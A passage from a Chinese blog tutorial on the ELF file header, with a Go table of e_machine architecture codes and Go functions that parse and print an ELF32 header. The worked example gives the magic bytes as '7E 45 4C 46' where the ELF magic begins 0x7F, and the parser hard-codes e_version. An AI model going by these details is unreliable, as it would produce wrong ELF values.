class="string">"HIOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line">		<span class="number">0xff00</span> : <span class="string">"LOPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line">		<span class="number">0xffff</span> : <span class="string">"HIPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h4><p>文件的目标体系结构类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">EhdrMachine := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0</span> : <span class="string">"No machine"</span>,</span><br><span class="line">		<span class="number">1</span> : <span class="string">"AT&amp;T WE 32100"</span>,</span><br><span class="line">		<span class="number">2</span> : <span class="string">"SPARC"</span>,</span><br><span class="line">		<span class="number">3</span> : <span class="string">"Intel 80386"</span>,</span><br><span class="line">		<span class="number">4</span> : <span class="string">"Motorola 68000"</span>,</span><br><span class="line">		<span class="number">5</span> : <span class="string">"Motorola 88000"</span>,</span><br><span class="line">		<span class="number">6</span> : <span class="string">"Reserved for future use (was EM_486)"</span>,</span><br><span class="line">		<span class="number">7</span> : <span class="string">"Intel 80860"</span>,</span><br><span class="line">		<span class="number">8</span> : <span class="string">"MIPS I Architecture"</span>,</span><br><span class="line">		<span class="number">9</span> : <span class="string">"IBM System/370 Processor"</span>,</span><br><span class="line">		<span class="number">10</span> : <span class="string">"MIPS RS3000 Little-endian"</span>,</span><br><span class="line">		<span class="number">11</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">12</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">13</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">14</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">15</span> : <span class="string">"Hewlett-Packard PA-RISC"</span>,</span><br><span class="line">		<span class="number">16</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">17</span> : <span class="string">"Fujitsu VPP500"</span>,</span><br><span class="line">		<span class="number">18</span> : <span class="string">"Enhanced instruction set SPARC"</span>,</span><br><span class="line">		<span class="number">19</span> : <span class="string">"Intel 80960"</span>,</span><br><span class="line">		<span class="number">20</span> : <span class="string">"PowerPC"</span>,</span><br><span class="line">		<span class="number">21</span> : <span class="string">"64-bit PowerPC"</span>,</span><br><span class="line">		<span class="number">22</span> : <span class="string">"IBM System/390 Processor"</span>,</span><br><span class="line">		<span class="number">23</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">24</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">25</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">26</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">27</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">28</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">29</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">30</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">31</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">32</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">33</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">34</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">35</span> : <span class="string">"Reserved for future use"</span>,</span><br><span class="line">		<span class="number">36</span> : <span class="string">"NEC V800"</span>,</span><br><span class="line">		<span class="number">37</span> : <span class="string">"Fujitsu FR20"</span>,</span><br><span class="line">		<span class="number">38</span> : <span class="string">"TRW RH-32"</span>,</span><br><span class="line">		<span class="number">39</span> : <span class="string">"Motorola RCE"</span>,</span><br><span class="line">		<span class="number">40</span> : <span class="string">"Advanced RISC Machines ARM"</span>,</span><br><span class="line">		<span class="number">41</span> : <span class="string">"Digital Alpha"</span>,</span><br><span class="line">		<span class="number">42</span> : <span class="string">"Hitachi SH"</span>,</span><br><span class="line">		<span class="number">43</span> : <span class="string">"SPARC Version 9"</span>,</span><br><span class="line">		<span class="number">44</span> : <span class="string">"Siemens TriCore embedded processor"</span>,</span><br><span class="line">		<span class="number">45</span> : <span class="string">"Argonaut RISC Core, Argonaut Technologies Inc."</span>,</span><br><span class="line">		<span class="number">46</span> : <span class="string">"Hitachi H8/300"</span>,</span><br><span class="line">		<span class="number">47</span> : <span class="string">"Hitachi H8/300H"</span>,</span><br><span class="line">		<span class="number">48</span> : <span class="string">"Hitachi H8S"</span>,</span><br><span class="line">		<span class="number">49</span> : <span class="string">"Hitachi H8/500"</span>,</span><br><span class="line">		<span class="number">50</span> : <span class="string">"Intel IA-64 processor architecture"</span>,</span><br><span class="line">		<span class="number">51</span> : <span class="string">"Stanford MIPS-X"</span>,</span><br><span class="line">		<span class="number">52</span> : <span class="string">"Motorola ColdFire"</span>,</span><br><span class="line">		<span class="number">53</span> : <span class="string">"Motorola M68HC12"</span>,</span><br><span class="line">		<span class="number">54</span> : <span class="string">"Fujitsu MMA Multimedia Accelerator"</span>,</span><br><span class="line">		<span class="number">55</span> : <span class="string">"Siemens PCP"</span>,</span><br><span class="line">		<span class="number">56</span> : <span class="string">"Sony nCPU embedded RISC processor"</span>,</span><br><span class="line">		<span class="number">57</span> : <span class="string">"Denso NDR1 microprocessor"</span>,</span><br><span class="line">		<span class="number">58</span> : <span class="string">"Motorola Star*Core processor"</span>,</span><br><span class="line">		<span class="number">59</span> : <span class="string">"Toyota ME16 processor"</span>,</span><br><span class="line">		<span class="number">60</span> : <span class="string">"STMicroelectronics ST100 processor"</span>,</span><br><span class="line">		<span class="number">61</span> : <span class="string">"Advanced Logic Corp. TinyJ embedded processor family"</span>,</span><br><span class="line">		<span class="number">62</span> : <span class="string">"AMD x86-64 architecture"</span>,</span><br><span class="line">		<span class="number">63</span> : <span class="string">"Sony DSP Processor"</span>,</span><br><span class="line">		<span class="number">64</span> : <span class="string">"Digital Equipment Corp. PDP-10"</span>,</span><br><span class="line">		<span class="number">65</span> : <span class="string">"Digital Equipment Corp. PDP-11"</span>,</span><br><span class="line">		<span class="number">66</span> : <span class="string">"Siemens FX66 microcontroller"</span>,</span><br><span class="line">		<span class="number">67</span> : <span class="string">"STMicroelectronics ST9+ 8/16 bit microcontroller"</span>,</span><br><span class="line">		<span class="number">68</span> : <span class="string">"STMicroelectronics ST7 8-bit microcontroller"</span>,</span><br><span class="line">		<span class="number">69</span> : <span class="string">"Motorola MC68HC16 Microcontroller"</span>,</span><br><span class="line">		<span class="number">70</span> : <span class="string">"Motorola MC68HC11 Microcontroller"</span>,</span><br><span class="line">		<span class="number">71</span> : <span class="string">"Motorola MC68HC08 Microcontroller"</span>,</span><br><span class="line">		<span class="number">72</span> : <span class="string">"Motorola MC68HC05 Microcontroller"</span>,</span><br><span class="line">		<span class="number">73</span> : <span class="string">"Silicon Graphics SVx"</span>,</span><br><span class="line">		<span class="number">75</span> : <span class="string">"Digital VAX"</span>,</span><br><span class="line">		<span class="number">76</span> : <span class="string">"Axis Communications 32-bit embedded processor"</span>,</span><br><span class="line">		<span class="number">77</span> : <span class="string">"Infineon Technologies 32-bit embedded processor"</span>,</span><br><span class="line">		<span class="number">78</span> : <span class="string">"Element 14 64-bit DSP Processor"</span>,</span><br><span class="line">		<span class="number">79</span> : <span class="string">"LSI Logic 16-bit DSP Processor"</span>,</span><br><span class="line">		<span class="number">80</span> : <span class="string">"Donald Knuth's educational 64-bit processor"</span>,</span><br><span class="line">		<span class="number">81</span> : <span class="string">"Harvard University machine-independent object files"</span>,</span><br><span class="line">		<span class="number">82</span> : <span class="string">"SiTera Prism"</span>,</span><br><span class="line">		<span class="number">83</span> : <span class="string">"Atmel AVR 8-bit microcontroller"</span>,</span><br><span class="line">		<span class="number">84</span> : <span class="string">"Fujitsu FR30"</span>,</span><br><span class="line">		<span class="number">85</span> : <span class="string">"Mitsubishi D10V"</span>,</span><br><span class="line">		<span class="number">86</span> : <span class="string">"Mitsubishi D30V"</span>,</span><br><span class="line">		<span class="number">87</span> : <span class="string">"NEC v850"</span>,</span><br><span class="line">		<span class="number">88</span> : <span class="string">"Mitsubishi M32R"</span>,</span><br><span class="line">		<span class="number">89</span> : <span class="string">"Matsushita MN10300"</span>,</span><br><span class="line">		<span class="number">90</span> : <span class="string">"Matsushita MN10200"</span>,</span><br><span class="line">		<span class="number">91</span> : <span class="string">"picoJava"</span>,</span><br><span class="line">		<span class="number">92</span> : <span class="string">"OpenRISC 32-bit embedded processor"</span>,</span><br><span class="line">		<span class="number">93</span> : <span class="string">"ARC Cores Tangent-A5"</span>,</span><br><span class="line">		<span class="number">94</span> : <span class="string">"Tensilica Xtensa Architecture"</span>,</span><br><span class="line">		<span class="number">95</span> : <span class="string">"Alphamosaic VideoCore processor"</span>,</span><br><span class="line">		<span class="number">96</span> : <span class="string">"Thompson Multimedia General Purpose Processor"</span>,</span><br><span class="line">		<span class="number">97</span> : <span class="string">"National Semiconductor 32000 series"</span>,</span><br><span class="line">		<span class="number">98</span> : <span class="string">"Tenor Network TPC processor"</span>,</span><br><span class="line">		<span class="number">99</span> : <span class="string">"Trebia SNP 1000 processor"</span>,</span><br><span class="line">		<span class="number">100</span> : <span class="string">"STMicroelectronics (www.st.com) ST200 microcontroller"</span>,</span><br><span class="line">		<span class="number">101</span> : <span class="string">"Ubicom IP2xxx microcontroller family"</span>,</span><br><span class="line">		<span class="number">102</span> : <span class="string">"MAX Processor"</span>,</span><br><span class="line">		<span class="number">103</span> : <span class="string">"National Semiconductor CompactRISC microprocessor"</span>,</span><br><span class="line">		<span class="number">104</span> : <span class="string">"Fujitsu F2MC16"</span>,</span><br><span class="line">		<span class="number">105</span> : <span class="string">"Texas Instruments embedded microcontroller msp430"</span>,</span><br><span class="line">		<span class="number">106</span> : <span class="string">"Analog Devices Blackfin (DSP) processor"</span>,</span><br><span class="line">		<span class="number">107</span> : <span class="string">"S1C33 Family of Seiko Epson processors"</span>,</span><br><span class="line">		<span class="number">108</span> : <span class="string">"Sharp embedded microprocessor"</span>,</span><br><span class="line">		<span class="number">109</span> : <span class="string">"Arca RISC Microprocessor"</span>,</span><br><span class="line">		<span class="number">110</span> : <span class="string">"Microprocessor series from PKU-Unity Ltd. and MPRC of Peking University"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h4><p>目标文件版本。固定值01 <strong>EV_CURRENT</strong></p>
<h4 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h4><p>程序入口的虚拟地址</p>
<h4 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h4><p>Program Header Table的偏移地址，即程序头部表索引地址</p>
<h4 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h4><p>Section Header Table的偏移地址，即节区表索引地址</p>
<h4 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h4><p>处理器相关标识</p>
<h4 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h4><p>ELF Header的大小</p>
<h4 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h4><p>Program Header Entry的大小，即程序头部表的单个表项的大小</p>
<h4 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h4><p>Program Header Entry的数目，即程序头部表的表项数</p>
<h4 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h4><p>Section Header Entry的大小，即节区表的单个表项的大小</p>
<h4 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h4><p>Section Header Entry的数目，即节区表的表项数</p>
<h4 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h4><p>即节区名称表(.shstrtab)位于节区表的位置，用于索引节区的名字</p>
<h3 id="读取ELF-Header"><a href="#读取ELF-Header" class="headerlink" title="读取ELF Header"></a>读取ELF Header</h3><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例如有一个ELF Header的二进制数据为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7E 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">02 00 03 00 01 00 00 00 10 83 04 08 34 00 00 00</span><br><span class="line">E0 17 00 00 00 00 00 00 34 00 20 00 09 00 28 00</span><br><span class="line">1F 00 1C 00</span><br></pre></td></tr></table></figure>

<p>那么e_ident即为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7E 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">值</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Ehdr_Class</td>
<td align="center">01</td>
<td align="center">ELF32</td>
</tr>
<tr>
<td align="center">Ehdr_Data</td>
<td align="center">01</td>
<td align="center">2’s complement, little endian</td>
</tr>
<tr>
<td align="center">Ehdr_Version</td>
<td align="center">01</td>
<td align="center">1 (current)</td>
</tr>
<tr>
<td align="center">Ehdr_OS</td>
<td align="center">00</td>
<td align="center">UNIX - System V</td>
</tr>
<tr>
<td align="center">Ehdr_ABIV</td>
<td align="center">00</td>
<td align="center">0x0</td>
</tr>
</tbody></table>
<p>e_type的二进制数据即为<code>02 00</code>因为是小端存储应该变为0002也就是2，所以也就是<code>Executable</code></p>
<p>以此类推即可</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>这里需要注意因为如果是小端序存储的话，需要转变为大端序才是一般常用的显示格式，所以我引入了<strong>LSBtoMSB</strong>函数，一些更具体的代码可以查看项目</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Ehdr Elf32_Ehdr)</span> <span class="title">ReadHeader</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="title">Elf32_Ehdr</span></span>&#123;</span><br><span class="line">	Ehdr = Ehdr.ReadMagic(data)</span><br><span class="line">	<span class="comment">//e_type</span></span><br><span class="line">	tmp := data[<span class="number">16</span>:<span class="number">18</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_type = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_machine</span></span><br><span class="line">	tmp = data[<span class="number">18</span>:<span class="number">20</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_machine = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_version</span></span><br><span class="line">	tmp = data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_version = Elf32_Word(<span class="number">1</span>)</span><br><span class="line">	<span class="comment">//e_entry</span></span><br><span class="line">	tmp = data[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_entry = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//e_phoff</span></span><br><span class="line">	tmp = data[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_phoff = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//e_shoff</span></span><br><span class="line">	tmp = data[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_shoff = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//e_flags</span></span><br><span class="line">	tmp = data[<span class="number">36</span>:<span class="number">40</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_flags = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//e_ehsize</span></span><br><span class="line">	tmp = data[<span class="number">40</span>:<span class="number">42</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_ehsize = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_phentsize</span></span><br><span class="line">	tmp = data[<span class="number">42</span>:<span class="number">44</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_phentsize = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_phnum</span></span><br><span class="line">	tmp = data[<span class="number">44</span>:<span class="number">46</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_phnum = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_shentsize</span></span><br><span class="line">	tmp = data[<span class="number">46</span>:<span class="number">48</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_shentsize = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_shnum</span></span><br><span class="line">	tmp = data[<span class="number">48</span>:<span class="number">50</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_shnum = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="comment">//e_shstrndx</span></span><br><span class="line">	tmp = data[<span class="number">50</span>:<span class="number">52</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	Ehdr.e_shstrndx = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line">	<span class="keyword">return</span> Ehdr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="输出ELF-Header"><a href="#输出ELF-Header" class="headerlink" title="输出ELF Header"></a>输出ELF Header</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Ehdr Elf32_Ehdr)</span> <span class="title">PHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Println(<span class="string">"ELF Header:"</span>)</span><br><span class="line">	fmt.Printf(<span class="string">"%-9s"</span>,<span class="string">"Magic: "</span>)</span><br><span class="line">	fmt.Println(Ehdr.Ehdr_Magic)</span><br><span class="line">	<span class="comment">//Class</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Class: "</span>)</span><br><span class="line">	tmpstr := EhdrClass[Ehdr.Ehdr_Class]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">"Invalid class"</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Data</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Data: "</span>)</span><br><span class="line">	tmpstr = EhdrData[Ehdr.Ehdr_Data]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">"Invaild data encoding"</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Version</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Version: "</span>)</span><br><span class="line">	tmpstr = EhdrVersion[Ehdr.Ehdr_Version]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">"Invaild version"</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//OS/ABI</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"OS/ABI: "</span>)</span><br><span class="line">	tmpstr = EhdrOSABI[Ehdr.Ehdr_OS]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">"Unknown"</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ABI Version</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"ABI Version:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.Ehdr_ABIV))</span><br><span class="line">	<span class="comment">//Type</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Type: "</span>)</span><br><span class="line">	tmpstr = EhdrType[<span class="keyword">int</span>(<span class="keyword">int32</span>(Ehdr.e_type))]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">"Unknown"</span> )</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(tmpstr )</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Machine</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Machine: "</span>)</span><br><span class="line">	tmpstr = EhdrMachine[<span class="keyword">int</span>(<span class="keyword">int32</span>(Ehdr.e_machine))]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">"Unknown"</span> )</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Version</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Version:"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_version)))</span><br><span class="line">	<span class="comment">//Entry point address</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Entry point address:"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_entry)))</span><br><span class="line">	<span class="comment">//Start of program headers</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Start of program headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_phoff),<span class="string">"(bytes into file)"</span>)</span><br><span class="line">	<span class="comment">//Start of section headers</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Start of section headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shoff),<span class="string">"(bytes into file)"</span>)</span><br><span class="line">	<span class="comment">//Flags</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"FLags:"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_flags)))</span><br><span class="line">	<span class="comment">//Size of this header</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Size of this header:"</span>)</span><br><span class="line">	fmt.Println(<span 